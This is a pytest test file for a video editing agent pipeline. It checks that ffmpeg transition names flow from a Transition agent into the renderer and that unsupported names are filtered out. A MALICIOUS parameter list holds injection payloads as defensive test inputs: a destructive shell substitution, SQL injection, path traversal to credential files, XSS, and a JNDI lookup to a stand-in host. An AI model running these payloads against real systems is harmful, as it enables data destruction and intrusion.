"""
Transition -> Render wiring.

The Transition agent chose the joins; this is the path that makes them
actually happen:

    Transition.xfade_sequence
        -> EditPlan.xfade_list      (validated on the way in)
        -> RenderSpec.xfade_list    (compile_render_spec)
        -> AT_XFADES                (env_overrides)
        -> build_video's XFADES     (the real renderer)

The property that matters most: a transition name ffmpeg does not know makes
the render fail outright, so nothing but the renderer's own vocabulary may
reach the far end of that chain - no matter how an EditPlan was built.
"""

import re
import typing

import pytest

from agents.artifacts import (EditPlan, RenderSpec, Segment, Story, StoryBeat,
                              Transition, TransitionChoice, TransitionKind)
from agents.editing_director import EditingDirectorAgent
from agents.tools.llm_tools import LLMClient
from agents.tools.render_tools import compile_render_spec
from agents.transition import TransitionAgent, _engine_transitions

CALM, LIVELY = "01_calm.mp4", "02_lively.mp4"


# ------------------------------------------------------------- helpers

def a_story(n=3):
    return Story(
        domain="model engineering", story_type="reasoned",
        logline="a gear train built and then run",
        beats=[StoryBeat(index=i + 1,
                         role="hook" if i == 0 else "develop",
                         clip_id=LIVELY if i % 2 == 0 else CALM,
                         narrative=f"beat {i + 1}")
               for i in range(n)],
        insufficient_signal=False, confidence=0.8, live=True)


def a_plan(xfade_list=None, n=3):
    segs = [Segment(index=i + 1, clip_id=f"c{i}.mp4", start=0.0, end=4.0,
                    duration=4.0, orientation="horizontal")
            for i in range(n)]
    return EditPlan(segments=segs, total_duration=float(4 * n),
                    target_seconds=float(4 * n), canvas=(1920, 1080),
                    xfade_list=xfade_list or [])


def spec_for(plan) -> RenderSpec:
    return compile_render_spec("j", "b", "s", plan)


# ------------------ 1. the Transition artifact produces a sequence

def test_the_transition_agent_produces_an_xfade_sequence(director_ctx,
                                                         tracer_span):
    ctx, _cs = director_ctx
    ctx.llm = LLMClient()                      # deterministic path
    agent = TransitionAgent()
    with tracer_span(ctx, "transition") as span:
        art = agent.execute(ctx, span, story=a_story(n=3))

    seq = art.payload.xfade_sequence
    assert seq == ["fade", "fade"], "3 beats -> 2 junctions"
    assert all(k in _engine_transitions() for k in seq)


def test_the_sequence_length_tracks_the_junction_count(director_ctx,
                                                       tracer_span):
    ctx, _cs = director_ctx
    ctx.llm = LLMClient()
    agent = TransitionAgent()
    for n in (2, 3, 5):
        with tracer_span(ctx, "transition") as span:
            art = agent.execute(ctx, span, story=a_story(n=n),
                                revision=n)
        assert len(art.payload.xfade_sequence) == n - 1


# --------- 2. EditingDirector copies it onto the plan, and it lands

def test_the_director_copies_the_sequence_onto_the_plan(director_ctx,
                                                        tracer_span):
    ctx, clip_set = director_ctx
    ctx.llm = LLMClient()
    trans = Transition(live=True, confidence=0.8, choices=[
        TransitionChoice(index=1, from_beat=1, to_beat=2, kind="wipeup"),
        TransitionChoice(index=2, from_beat=2, to_beat=3, kind="smoothleft")])

    with tracer_span(ctx, "editing_director") as span:
        art = EditingDirectorAgent().execute(ctx, span, clip_set=clip_set,
                                             transition=trans, revision=0)
    assert art.payload.xfade_list == ["wipeup", "smoothleft"]


def test_the_plan_reaches_render_spec(director_ctx, tracer_span):
    ctx, clip_set = director_ctx
    ctx.llm = LLMClient()
    trans = Transition(live=True, choices=[
        TransitionChoice(index=1, from_beat=1, to_beat=2, kind="fadewhite")])
    with tracer_span(ctx, "editing_director") as span:
        art = EditingDirectorAgent().execute(ctx, span, clip_set=clip_set,
                                             transition=trans, revision=0)
    spec = spec_for(art.payload)
    assert spec.xfade_list == ["fadewhite"]


def test_no_transition_keeps_the_previous_default(director_ctx, tracer_span):
    """Plans made before this agent existed must behave exactly as before."""
    ctx, clip_set = director_ctx
    ctx.llm = LLMClient()
    with tracer_span(ctx, "editing_director") as span:
        art = EditingDirectorAgent().execute(ctx, span, clip_set=clip_set,
                                             transition=None, revision=0)
    assert art.payload.xfade_list == []
    spec = spec_for(art.payload)
    n_cuts = max(len(art.payload.segments) - 1, 1)
    assert spec.xfade_list == ["fade"] * n_cuts


def test_an_old_plan_without_the_field_still_compiles():
    """A checkpoint written before the field existed deserialises fine."""
    raw = a_plan().model_dump(mode="json")
    raw.pop("xfade_list", None)
    restored = EditPlan.model_validate(raw)
    assert restored.xfade_list == []
    assert spec_for(restored).xfade_list == ["fade", "fade"]


# ------- 3. unsupported / malicious names cannot reach RenderSpec

MALICIOUS = [
    "$(rm -rf /)", "; DROP TABLE artifacts; --", "../../../etc/passwd",
    "C:\\Windows\\System32\\cmd.exe", "xfade=transition=fade:duration=99",
    "' OR '1'='1", "<script>alert(1)</script>", "file:///etc/shadow",
    "\x00truncated", "${jndi:ldap://evil.test/x}",
    "circleopen", "pixelize", "cut", "none", "FADE", "fade ",
]


@pytest.mark.parametrize("bad", MALICIOUS)
def test_an_unsupported_name_is_filtered_at_the_plan(bad):
    plan = a_plan(["fade", bad, "wipeup"])
    assert bad not in plan.xfade_list
    assert plan.xfade_list == ["fade", "wipeup"]


@pytest.mark.parametrize("bad", MALICIOUS)
def test_an_unsupported_name_never_reaches_render_spec(bad):
    spec = spec_for(a_plan([bad]))
    for name in spec.xfade_list:
        assert name in _engine_transitions()
    assert bad not in spec.xfade_list


@pytest.mark.parametrize("bad", MALICIOUS)
def test_an_unsupported_name_never_reaches_at_xfades(bad):
    env = spec_for(a_plan(["fade", bad])).env_overrides()
    assert bad not in env["AT_XFADES"]
    for name in env["AT_XFADES"].split(","):
        assert name in _engine_transitions()


@pytest.mark.parametrize("junk", [None, 7, 1.5, True, {"a": 1}, ["nested"]])
def test_non_string_entries_are_filtered_not_raised(junk):
    """One odd entry on a resumed job should cost that entry, not the build."""
    plan = a_plan(["fade", junk, "wipeup"])
    assert plan.xfade_list == ["fade", "wipeup"]


def test_a_non_list_becomes_empty_rather_than_exploding():
    segs = [Segment(index=1, clip_id="a.mp4", start=0.0, end=4.0,
                    duration=4.0, orientation="horizontal")]
    plan = EditPlan(segments=segs, total_duration=4.0, target_seconds=4.0,
                    canvas=(1920, 1080), xfade_list="fade")
    assert plan.xfade_list == []


def test_an_all_junk_sequence_falls_back_to_the_default():
    plan = a_plan(["circleopen", "cut", "$(evil)"])
    assert plan.xfade_list == []
    assert spec_for(plan).xfade_list == ["fade", "fade"]


def test_the_filter_allows_exactly_the_renderer_vocabulary():
    for kind in typing.get_args(TransitionKind):
        assert a_plan([kind]).xfade_list == [kind]
    assert sorted(typing.get_args(TransitionKind)) == _engine_transitions()


# ------------------ 4. the existing AT_XFADES bridge receives it

def test_at_xfades_carries_the_sequence_in_order():
    spec = spec_for(a_plan(["wipeup", "fadewhite"]))
    assert spec.env_overrides()["AT_XFADES"] == "wipeup,fadewhite"


def test_at_xfade_t_stays_global_and_untouched():
    """This fix must not introduce a per-transition duration."""
    spec = spec_for(a_plan(["wipeup", "fadewhite"]))
    env = spec.env_overrides()
    assert env["AT_XFADE_T"] == str(spec.xfade_duration)
    assert "duration" not in TransitionChoice.model_fields
    assert isinstance(spec.xfade_duration, float)


def test_the_renderer_parses_at_xfades_the_way_we_write_it():
    """build_video splits AT_XFADES on commas - the same shape we emit."""
    src = open("pipeline/build_video.py", encoding="utf-8").read()
    assert 'os.environ["AT_XFADES"].split(",")' in src
    written = spec_for(a_plan(["wipeup", "fadewhite"])
                       ).env_overrides()["AT_XFADES"]
    assert [x for x in written.split(",") if x] == ["wipeup", "fadewhite"]


def test_a_shorter_sequence_is_safe_because_the_renderer_cycles():
    """One name for three cuts repeats; it does not crash or run out."""
    src = open("pipeline/build_video.py", encoding="utf-8").read()
    assert re.search(r"XFADES\[\(i - 1\) % len\(XFADES\)\]", src)
    spec = spec_for(a_plan(["wipeup"], n=4))       # 3 cuts, 1 name
    assert spec.xfade_list == ["wipeup"]


def test_a_longer_sequence_is_safe_because_extras_are_unreached():
    spec = spec_for(a_plan(["fade", "wipeup", "smoothup", "wipeleft"], n=2))
    assert len(spec.xfade_list) == 4               # 1 cut, 4 names
    assert all(k in _engine_transitions() for k in spec.xfade_list)


# --------------------------- 5. the critic cycle is unchanged

def test_a_changed_sequence_still_invalidates_the_plan_cache(director_ctx,
                                                             tracer_span):
    ctx, clip_set = director_ctx
    ctx.llm = LLMClient()
    agent = EditingDirectorAgent()
    one = Transition(choices=[TransitionChoice(index=1, from_beat=1,
                                               to_beat=2, kind="fade")])
    two = Transition(choices=[TransitionChoice(index=1, from_beat=1,
                                               to_beat=2, kind="wipeup")])
    with tracer_span(ctx, "editing_director") as span:
        a = agent.execute(ctx, span, clip_set=clip_set, transition=one,
                          revision=0)
    with tracer_span(ctx, "editing_director") as span:
        b = agent.execute(ctx, span, clip_set=clip_set, transition=two,
                          revision=1)
    assert a.inputs_hash != b.inputs_hash
    assert a.payload.xfade_list != b.payload.xfade_list


def test_the_spec_hash_changes_with_the_sequence():
    """RenderingAgent hashes the whole spec, so a new join set re-renders."""
    a = spec_for(a_plan(["fade", "fade"])).model_dump(mode="json")
    b = spec_for(a_plan(["wipeup", "fade"])).model_dump(mode="json")
    assert a != b


def test_segment_cache_keys_are_untouched_by_transitions():
    """A join is between segments, so changing it must NOT invalidate the
    segments themselves - that would make every revision re-render
    everything."""
    a = spec_for(a_plan(["fade", "fade"]))
    b = spec_for(a_plan(["wipeup", "smoothup"]))
    assert [s.cache_key for s in a.segments] == [s.cache_key
                                                 for s in b.segments]


def test_a_revision_keeps_the_same_sequence_when_transitions_are_unchanged(
        director_ctx, tracer_span):
    """Transition is upstream of the critic cycle, so a re-plan reuses it."""
    ctx, clip_set = director_ctx
    ctx.llm = LLMClient()
    agent = EditingDirectorAgent()
    trans = Transition(choices=[
        TransitionChoice(index=1, from_beat=1, to_beat=2, kind="smoothup")])

    with tracer_span(ctx, "editing_director") as span:
        first = agent.execute(ctx, span, clip_set=clip_set,
                              transition=trans, revision=0)
    from agents.artifacts import RevisionRequest
    req = RevisionRequest(from_attempt=1, target_agent="editing_director",
                          issue="open livelier", severity="high",
                          constraints={"opening_must_be_liveliest": True})
    with tracer_span(ctx, "editing_director") as span:
        second = agent.execute(ctx, span, clip_set=clip_set,
                               transition=trans, revision=1,
                               revision_request=req)

    assert first.payload.xfade_list == ["smoothup"]
    assert second.payload.xfade_list == ["smoothup"], \
        "a revision must not lose or change the joins"
    assert spec_for(second.payload).xfade_list == ["smoothup"]
